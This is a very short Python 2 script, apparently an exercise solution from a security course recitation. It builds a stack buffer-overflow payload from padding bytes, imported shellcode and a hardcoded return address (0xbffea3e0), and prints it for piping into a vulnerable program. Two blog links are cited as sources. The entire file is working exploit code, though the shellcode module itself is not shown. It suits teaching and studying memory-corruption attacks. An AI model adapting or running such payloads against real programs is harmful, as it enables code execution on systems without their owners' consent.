from shellcode import shellcode
from struct import pack
print '\x10'*0x110+shellcode+'\x01'*741+pack("<I",0xbffea3e0)

#recitation
#http://www.arkteam.net/?p=443
#https://blog.csdn.net/forevertingting/article/details/77073833
